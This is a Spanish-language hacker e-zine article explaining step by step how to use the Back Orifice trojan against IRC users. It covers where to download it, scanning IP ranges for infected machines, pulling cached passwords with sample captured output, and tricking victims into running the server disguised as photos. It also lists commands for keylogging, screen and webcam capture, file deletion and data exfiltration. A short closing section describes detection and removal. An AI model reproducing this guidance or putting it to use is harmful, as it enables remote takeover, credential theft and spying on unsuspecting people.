		{√{{Back Orifice{}}}

Pues como habia prometido aqui esta la segunda parte de este articulo,
tratare de  explicar de forma clara y concisa el uso del BO, de una 
forma practica y las posibles aplicaciones que se le pueden dar en IRC.
Una pequena parte del texto consiste en la recopilacion/traduccion del
trabajo de otros. 


<<<<<®Donde puedo conseguir el Bo?>>>>>

BO se puede conseguir en las siguientes direcciones:

http://www.cultdeadcow.com/ (pagina oficial)
http://www.vanhackez.com/
www.members.xoom.com/lynx/ en la zona de download (descarga).


<<<<<®Ya tengo el Bo.zip, ®Que contiene?>>>>>

El bo.zip o bo120.zip consta de una serie de archivos:

bo.txt   Oscuro documento explicativo. No se entiende mucho.
plugin.txt  Traducido en el epigrafe Apendice de este doc.
boserve.exe  El servidor autoinstalable del BO
bogui.exe  Cliente Grafico gui del BO
boclient.exe  Cliente en modo texto del BO (funciona bajo Ms-dos)
boconfig.exe  Utilidad de configuracian y plugin del server de BO
melt.exe  Descompresor de archivos comprimidos con el comando freeze
freeze.exe  Compresor de archivos. SE pueden descomprimir con melt.

<<<<<®Que hacer con todos estos archivos?>>>>>

Para que todo funcione correctamente debes saber que BAJO NINGUN
CONCEPTO debes ejecutar boserve.exe, pues te harÌa sensible al ataque.
Ahora bien,  si eres una de esas mentes inquietas, por que no ejecutarlo?.
Asi pones en practica de una vez como eliminarlo. Recuerda que somos 
Esclavos del Conocimiento :) 
Ademas entender como trabajan los troyanos es el primer paso para 
protegernos de ellos.

Antes de empezar
~~~~~~~~~~~~~~~~ 
Te recomiendo el Nobo ya que cuando estas utilizando el BackOrifice estas
infectado temporalmente si asi podemos llamarle. Puedes encontrarlo en la
primera entrega de este magazine. Asi como  en la seccion de archivos de la 
pagina.


			MANEJO EN AMBIENTE GRAFICO
			~~~~~~~~~~~~~~~~~~~~~~~~~~


Para comenzar, un doble click en bogui.exe, aparecera el BO en 
ambiente grafico. 

El siguiente paso sera averiguar la ip de la victima.


<<<<<®Como lo hago?>>>>>


Hay varias formas:

1) En el IRC; creo que no necesita explicacion :)

2) En el ICQ. Un click en el boton ICQ, luego password security y listo!

3) Y porque no? con tu propia ip. Un click en el boton INICIO, luego ejecutar
y finalmente digitas winipcfg. 

Una vez obtenidas las Ips, realizamos un barrido de Ips para saber cuales 
personas estan infectadas con el troyano.
 
<<<<<®Como lo hago?>>>>>

Bien facil, te lo explicare bien detallado para que entiendas.
tenemos una Ip Ej: 205.244.33.28

En el campo Host en vez de introducir la ip completa, solo tomamos tres
numeros despues de cada punto y le agregamos un asterisco Ej: 205.244.33.*

Una vez realizado iran saliendo una serie de mensajes que no es mas que las 
ipS de las personas infectadas con el troyano.
Ej:

---------- Packet received from host 205.244.33.28 port 31337 ---------
  !PONG!1.20!DEFAULT! (protegido)
------------------------- End of Data -------------------
---------- Packet received from host 205.244.33.217 port 31337 ---------
  !PONG!1.20!DEFAULT! (protegido)
------------------------- End of Data -------------------
---------- Packet received from host 205.244.33.223 port 31337 ---------
  !PONG!1.20!HUASCARF! (Sin proteccion)
------------------------- End of Data -------------------

Luego nuestra tarea sera saber o identificar las que estan o no protegidas.
Y no sera tarea dificil ya que existe una pequena diferencia si te fijas 
en el ejemplo anterior. Y es la siguiente, todas dicen !PONG!1.20 DEFAULT
con excepcian de la ultima !PONG!1.20!HUASCARF!, el cual seria el nombre
de la makina de nuestra victima.  

Una vez realizado esto metemos la ip de la victima (sin el asterisco, por 
supuesto). Que en este caso es 205.244.33.223

Seleccionamos el comando System Password, que es el que en realidad nos 
interesa y obtenemos lo siguiente:

** 7:System passwords packet sent (19 bytes) val1: '' val2: ''
---------- Packet received from host 205.244.33.223 port 31337 ---------
Password cached by system:
index:01(06) len:60(43/82)
Resource: '*Rna\OOBE Registration\oobeosr1@reg.msn.com'  Password: 'register'
index:00(06) len:36(20/72)
Resource: '*Rna\Codetel\huascar.f'  Password: 'ilmcmd1(ê∑1@reg.msn.comregister'
End of cached passwords.
Unable to read value 'ScreenSave_Data'

Nota: El BO saca los todos los passwords del cache de la makina, incluyendo
el Screen Saver (protector de pantalla) siendo el ultimo password obtenido el 
que esta utilizando la victima actualmente, ademas cabe mencionar que puede 
arrastrar consigo basura (caracteres ascii).

<<<<<®Entonces, cual es el password?>>>>>

Username: huascar.f
Password: ilmcd1


Otro paso seria meterle como sea el archivo boserve.exe y conseguir 
que lo ejecute.

Aqui entra en juego la imaginacion de cada uno. El campo ideal de accion es
el IRC. Aqui los pobres chateros de a pie hablan a sus anchas, desconocedores
del peligro que les acecha.

<<<<<®Como le meto el BO al chico carabelita?>>>>>

Hay que elegir una victima que trabaje bajo windows. Todos sabemos que
eso es facil de averiguar en IRC.

Truco facil y muy visto, por tanto poco efectivo: renombrar boserve.exe
a fotos.exe. Si ya tienes algo de confianza con la victima en cuestion
lo aceptara sin mayores problemas. Para gente mas desconfiada, intenta
colarselo despues de hacerte tu el desconfiado:

Cuando el chico carabelita ejecute fotos.exe y vea que no aparece nada por
ningun lado, lo mas seguro es que te pregunte porque no funciona, y con 
razon. Te disculpas y le dices que el archivo esta defectuoso y que
te lo vas a volver a bajar. Lo que te apetezca, pero queda bien con el,
para que no se corra la voz y sigan confiando en ti y en tus fotos >;->.

Es conveniente hacerselo a varios a la vez en privado, para tener un buen
numero de victimas. Con la excusa de volvertelo a bajar, te sales de Irc.
Vuelves a entrar con otro nick y a trabajar.


				MODO MS-DOS
				~~~~~~~~~~~

Bien una vez dominado Bo en ambiente grafico, vamos a trabajar MODO MS-DOS 
con el boclient.exe, claro esta :)

<<<<<®Como accedo al ordenador del chico carabelita?>>>>>

  Pasos a seguir:
  a) Copiar boclient.exe en tu directorio raiz, c:\
  b) Abrir una ventana de msdos en w95
  c) Resolver la ip de la victima. Facil de hacer en IRC. Si quieres le
das conversacion para que no se vaya.
  d) En la ventana de msdos, desde la linea de comandos ejecutar
boclient.exe a continuacion teclea host "IPdelavictima", sin comillas.
  e) En teoria ya estas dentro.

<<<<<®Que puedo hacer una vez dentro?>>>>>

Puedes hacer maravillas. Pero por algo hay que empezar:
Desde bo tecleas dir. Te mostrara los archivos de su HD.
Si tecleas passes te saldran cosas interesantes, osea, algun0s
passwords.
Puedes teclear cd directorio para explorar. Como en MsDos.
Facil.


Cosas bonitas para "perfeccionistas"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Puedes abrirle el puerto http y ver su disco duro camodamente con tu
navegador (A ver si soy capaz de hacerme entender):
Una vez dentro tienes que teclear httpon 80, o sea activar el http y el
puerto. Si por ejemplo tiene conectado el http con otra cosa, se lo
cierras primero con httpoff y el puerto que tenga abierto.  

<<<<<®como saber el puerto que tiene abierto?>>>>>

Facil, ®un scaneado? Ejecutas el httpon  y te dice el estado del http y 
el puerto es decir, le cierras los puertos que tenga abiertos y luego le 
abres el 80.

Mas comandos (traducido de la documentacion que acompana al BO):
Recuerda que en todo momento hablamos del cliente de texto, el
boclient.exe.

appadd   Lanza una aplicacion de texto en un puerto tcp. Para controlar
una aplicacion dos o de texto (como el command.com) via telnet.

appdel   evita que una aplicacion oiga las conexiones.

applist  Da un listado de las aplicaciones que escuchan la conexion en
ese momento.

md  Crea un directorio.

dir  muestra los archivos y directorios.

rd  Borra un directorio.

shareadd Crea un export en el servidor.

sharedel Borra un export.

copy  Copia archivos.

del  Borra archivos.

find     Busca en el arbol los archivos.

freeze  Comprime un archivo

melt  Descomprime un archivo comprimido con freeze.

view  Visor del contenido de un archivo.

httpoff  Cierra el servidor http.

httpon  Abre el servidor http.

keylog  Logea las teclas que se aprietan en el servidor (victima) a un
       archivo de texto. El log muestra el nombre de la ventana en que
       se tecleo el texto.

keylog   stopend Acaba el log de teclado.

capavi   Captura video y audio de un dispositivo a un archivo .avi

capscreen Captura una imagen de la pantalla del server a formato .bmp

listcaps  da un listado de los dispositivos de entrada de video.

sound   ejecuta un archivo de sonido en el servidor (Te lo imaginas?).

netlist   Listado de las conexiones de red.

netdisconnect Desconecta el servidor de una red.

netconnect Conecta el servidor a una red.

netview  Ve todas las interfaces de red, servidores, dominios .

ping Hace ping al host. Da el nombre del host y la version del BO.

pluginexec Ejecuta un plugin para BO.

pluginkill Cierra el plugin.

pluginlist Da un listado de los plugin activos.

prockill   Finaliza un proceso.

proclist   Listado de los procesos en curso.

procspawn  Ejecuta un programa.

rediradd  Redirecciona los paquetes ip entrantes a otra ip

redirdel Para el redireccionamiento.

redirlist Listado de puertos de rediccionamiento activos

regmakekey Crea una entrada en el registro

regdelkey Borra una entrada en el registro.

regdelval Borra un valor del registro.

reglistkeys Listado sub llaves de una llave del registro

reglistvals Listado de los valores de una llave del registro

regsetval establece el valor de una llave del registro

resolve resuelve la direccion ip del server

dialog Crea un cuadro de dialogo con el texto que quieras y el boton ok

info Da la informacion completa del server

lockup cierra el server

passes Muestra las contrasenas del usuario actual y la del
salvapantallas. Pueden contener basura al final.

reboot Apaga el server y lo reinicia. XDDD

tcprecv Conecta el server a una ip concreta y guarda la data recibida de
esa conexion al archivo especificado.

tcpsend conecta el server a una ip, manda el contenido del archivo
        especificado y cierra la conexion



<<<<<®Me puedo aprovechar del trabajo de otros?>>>>>

Por supuesto. Otros ya han hecho la parte mas dura por ti (colar el
troyano).
Puedes probar "a ciegas" desde bo cada ip, con el comando host "ip". Si
te funciona el comando dir, °°°esta infectado!!! O sea, que estas dentro.
Aun mejor realiza un barrido de Ips con el Bogui.exe(ambiente grafico).

Parece ser segun http://www.ntbugtraq.com/ que existen por ahi varios
detectores de B.O. (entre ellos el BoSniffer.zip) que son en realidad
troyanos (con el BOServer + el pluggin SpeakEasy). Este troyano intenta
un login en el canal #BO_OWNED de un servidor IRC con un nick aleatorio
informando ademAs de la IP del "afortunado galardonado" con el troyano.

<<<<<®Puedo formatearle el Disco Duro?>>>>>

Espero que no abuses de los conocimientos obtenidos. No hagas putadas.
Roba fotos porno, crea un dir "Pervertido" o "Mehemetidoentuvida".
Intenta acceder al cdrom. Ejecutale un archivo de sonido.
Que flipe, pero no abuses.
Si hace un Netstat vera tu ip. Y has de saber que con la IP, y la hora en
que ocurria todo, el ISP y Jodetel, de la mano como hermanos, os pueden
recomendar un bello hotelito... lo de siempre, precaucion.


Protecciones caseras contra BO
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Algunas versiones de BO estan modificadas para no ser detectadas por
Norton y otros. 

1) Una manera casera de detectar BO es buscar en c:\windows\system, si ves un
espacio entre los iconos,  esto siginifica que el Bo esta 
invisible, si el archivo contiene 22 kb, estas infectado!!!.
Ademas debes buscar anomalias como windll.dll, la libreria que BO usa por 
defecto para cargarse en el sistema.

2)Desde msdos digita netstat -an, este te dira los puertos que estan
escuchando en ese momento en tu makina. Por defecto BO usa el 31377.

3) Otra manera es buscar la cadena "bofilemapping". Otra es hacer 
"command /k /netstat -n" y ver si hay algun puerto funcionando en 3000 
y pico. Por defecto BO usa el 31377.
 
4) Una vez detectado lo borras, komo es de saber desde Guindouz no lo puedes
realizar, ya que cuando una aplicacion esta corriendo no la puedes eliminar 
®Cierto o No? Hackers, Wannabes y demases :)

<<<<<®Entonces, que hago?>>>>>

Facil!, reinicias la makina presionas F8 y eliges Modo Ms-dos.
Una vez en el dos digitas cd windows\system.
Luego digitas el comando del exe~1 y listo!!
Cabe mencionar que no siempre tendra este nombre, recuerda que el 
Bo se puede configurar a tu antojo. 

4) Otra manera es yendo al registro.

<<<<<®Como llego al registro?>>>>>   
Hay varias maneras, creo que esta es la mas facil.

a) Un click en Inicio.
b) Eliges Ejecutar.
c) Digitas "regedit" (sin las comillas).
d) Y finalmente <enter>.

   HEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
   y buscar anomalias como windll.dll, la libreria que BO usa por defecto
   para cargarse en el sistema.

Por supuesto puede tener otro nombre y estar acompanada de comentarios
falsos "Key file for Windows System Tray, do not delete", etc.

BO no puede acceder a directorios cuyo nombre contenga un alt+255, este
puede ser un buen lugar para instalar el antivirus.
 

PROTECCIONES GRATUITAS CONTRA BO:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1) El nobo, cuya funcion es logear al atakante y darte la ip del mismo.
   Ademas con el nobo puedes saber si estas  o no infectado con el troyano,
   ya que cuando lo ejecutas en tu makina te dara el siguiente error:
   "A network has ocurred error: Address already in use. May Back Orifice
   is already listening on the port I tried to bind? (10048-49)".

             http://web.cip.com.br/nobo/

2) Liberator (lo mismo que el primero). 

             http://liberator.com/

3) Mcafee 4.02(recomendado) y Symantec Norton Antivirus tambien son efectivos 
contra BO. 

http://mcafee.com/
http:/symantec.com/
http://www.brunoxys.com



<<<<Accesorios(plugins) para BO>>>>

  * "SpeakEasy" Abre un canal IRC BO_OWNED donde se muestra informacion
  sobre la IP de la victima
  * "SaranWrap" Pega BO a cualquier otro programa.
  * "SilkRope" Idem SaranWrap pero con encriptacion de 8 bits.
  * "ButtTrumpet" Manda eamail a una direccion predeterminada con la
  IP de la victima.
  * Programas que desactivan las protecciones contra BO (solo he oido
  hablar de ellos, pero si hay virus que lo hacen con AVP probablemente
  ya esten por ahi versiones para BO).

